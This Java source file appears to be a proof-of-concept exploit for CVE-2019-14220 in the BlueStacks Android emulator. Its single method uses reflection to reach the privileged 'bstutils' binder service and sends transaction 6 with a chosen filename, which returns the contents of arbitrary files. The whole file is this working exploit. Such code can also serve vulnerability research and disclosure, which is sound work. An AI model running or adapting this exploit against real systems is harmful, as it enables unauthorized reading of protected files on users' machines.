package seqred.bluestackfilereadhack;

import android.os.IBinder;
import android.os.Parcel;

import java.lang.reflect.Method;

public class CVE_2019_14220 {
    
    public static String getFileContents(String filename) {
        Parcel in = Parcel.obtain(), out = Parcel.obtain();
        try {
            Class servicemanager = Class.forName("android.os.ServiceManager");
            Method getservice = servicemanager.getMethod("getService", String.class);
            IBinder binder = (IBinder) getservice.invoke(servicemanager, new Object[]{"bstutils"});
            in.writeInterfaceToken("com.bluestacks.os.IBstUtilsService");
            in.writeString(filename);
            binder.transact(6, in, out, 0);
            out.readException();
            return out.readString();
        } catch (Throwable e) {
            return null;
        } finally{
            in.recycle();
            out.recycle();
        }
    }
    
}
